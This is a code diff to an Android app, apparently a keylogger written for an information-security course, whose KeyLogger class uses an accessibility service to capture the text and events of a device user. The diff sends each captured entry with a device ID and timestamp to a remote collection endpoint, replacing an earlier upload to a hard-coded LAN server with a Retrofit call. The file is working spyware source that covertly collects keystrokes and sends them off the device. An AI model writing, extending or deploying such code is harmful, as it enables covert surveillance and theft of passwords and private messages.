@@ -1,8 +1,12 @@
 package com.maemresen.infsec.keylogapp;
 
 import android.accessibilityservice.AccessibilityService;
+import android.os.AsyncTask;
+import android.os.Build;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
+
+import androidx.annotation.RequiresApi;
 
 import com.android.volley.AuthFailureError;
 import com.android.volley.RequestQueue;
@@ -10,32 +14,89 @@ import com.android.volley.VolleyError;
 import com.android.volley.toolbox.JsonObjectRequest;
 import com.android.volley.toolbox.Volley;
 import com.maemresen.infsec.keylogapp.model.KeyLog;
+import com.maemresen.infsec.keylogapp.retrofit.ApiInterface;
+import com.maemresen.infsec.keylogapp.retrofit.ServiceGenerator;
 import com.maemresen.infsec.keylogapp.util.DateTimeHelper;
 
+//import org.apache.http.client.HttpClient;
+//import org.apache.http.client.methods.HttpPost;
+//import org.apache.http.entity.StringEntity;
+//import org.apache.http.impl.client.DefaultHttpClient;
+//import org.apache.http.params.HttpConnectionParams;
+//import org.apache.http.params.HttpParams;
+//import org.apache.http.protocol.HTTP;
+import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.BufferedOutputStream;
+import java.io.BufferedReader;
+import java.io.BufferedWriter;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.io.OutputStreamWriter;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.ProtocolException;
+import java.net.URL;
+import java.time.LocalDateTime;
+import java.time.LocalTime;
+import java.time.format.DateTimeFormatter;
 import java.util.Date;
 import java.util.LinkedHashMap;
 import java.util.Map;
 
-/**
- * @author Emre Sen, 14.05.2019
- * @contact maemresen07@gmail.com
- */
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
+
 public class KeyLogger extends AccessibilityService {
 
     private final static String LOG_TAG = Helper.getLogTag(KeyLogger.class);
 
-    @Override
-    public void onServiceConnected() {
-        Log.i(LOG_TAG, "Starting service");
+    private class SendToServerTask extends AsyncTask<String, Void, String> {
+        @Override
+        protected String doInBackground(String... params) {
+
+            String urlString = "http://localhost:8080/keylog/save";
+            OutputStream out = null;
+
+            try {
+                URL url = new URL(urlString);
+                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
+                out = new BufferedOutputStream(urlConnection.getOutputStream());
+
+                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(out,"UTF-8"));
+                writer.write("AAA");
+                writer.flush();
+                writer.close();
+                out.close();
+
+                urlConnection.connect();
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            return params[0];
+        }
     }
 
+
+    @Override
+    public void onServiceConnected() {
+        Log.d("Keylogger", "Starting Service");
+        Log.i(LOG_TAG, "Starting service"
+        );
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.O)
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-
+        Log.d("Keylogger", "accessibilityEvent");
         String uuid = Helper.getUuid();
-        Date now = DateTimeHelper.getCurrentDay();
+//        Date now = DateTimeHelper.getCurrentDay();
+        LocalDateTime time = LocalDateTime.now();
+        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
         String accessibilityEvent = null;
         String msg = null;
 
@@ -66,39 +127,44 @@ public class KeyLogger extends AccessibilityService {
 
         KeyLog keyLog = new KeyLog();
         keyLog.setUuid(uuid);
-        keyLog.setKeyLogDate(now);
+        keyLog.setKeyLogDate(String.valueOf(time.format(formatter)));
         keyLog.setAccessibilityEvent(accessibilityEvent);
         keyLog.setMsg(msg);
 
-        sendLog("http://192.168.1.37:8080/keylog/save", keyLog);
+        Log.d("Keylogger", "keylog" + keyLog);
+
+
+        sendData(keyLog);
     }
 
     private Map<String, String> getMap(KeyLog keyLog) throws IllegalAccessException {
         Map<String, String> result = new LinkedHashMap<>();
         result.put("uuid", keyLog.getUuid());
-        result.put("keyLogDate", DateTimeHelper.getTheDateInString(keyLog.getKeyLogDate()));
+        result.put("keyLogDate", String.valueOf(keyLog.getKeyLogDate()));
         result.put("accessibilityEvent", keyLog.getAccessibilityEvent());
         result.put("msg", keyLog.getMsg());
         return result;
     }
 
 
-    private void sendLog(String uploadUrl, KeyLog keyLog) {
+    private void sendData(KeyLog keyLog) {
 
-        try {
-            RequestQueue requestQueue = Volley.newRequestQueue(this);
-            JsonObjectRequest keyLogRequest = new JsonObjectRequest(uploadUrl
-                    , new JSONObject(getMap(keyLog))
-                    , this::onResponse
-                    , this::onErrorResponse
-            );
-            Log.i(LOG_TAG, String.valueOf(keyLogRequest.getHeaders()));
-            Log.i(LOG_TAG, new String(keyLogRequest.getBody()));
-            requestQueue.add(keyLogRequest);
-        } catch (AuthFailureError | IllegalAccessException authFailureError) {
-            authFailureError.printStackTrace();
-        }
+        ApiInterface apiInterface = ServiceGenerator.createService(ApiInterface.class);
+        Call<String> call = apiInterface.sendData(keyLog);
+        call.enqueue(new Callback<String>() {
+            @Override
+            public void onResponse(Call<String> call, Response<String> response) {
+                Log.d("Keylogger", "SUCCESS");
+            }
+
+            @Override
+            public void onFailure(Call<String> call, Throwable t) {
+                Log.d("Keylogger", "FALURE" );
+            }
+        });
     }
+
+
 
     private void onResponse(JSONObject response) {
         Log.i(LOG_TAG, "Response is : " + response);
